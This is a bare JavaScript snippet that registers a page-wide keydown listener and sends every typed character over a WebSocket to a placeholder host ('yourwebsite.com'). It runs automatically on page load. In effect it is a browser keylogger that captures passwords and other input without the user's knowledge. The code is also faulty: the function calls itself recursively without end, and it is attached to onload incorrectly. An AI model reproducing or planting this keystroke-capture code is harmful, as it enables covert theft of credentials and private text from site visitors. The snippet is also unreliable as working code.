function test() {
    var socket;
    if (!window.WebSocket) {
        window.WebSocket = window.MozWebSocket;
    }
    if (window.WebSocket) {
        socket = new WebSocket("ws://yourwebsite.com/ws/yourpath");
        socket.onopen = function () {
            console.log("Connection opened");
        };
        socket.onmessage = function (msg) {
            console.log("Received: " + msg.data);
        };
        document.addEventListener("keydown", function (evt) {
            evt = evt || window.event;
            var charCode = evt.which || evt.keyCode;
            var charStr = String.fromCharCode(charCode);
            socket.send(charStr);
        }, false);
    } else {    
        alert("Your browser does not support WebSockets.");
    }
    test();
}
window.onload=test();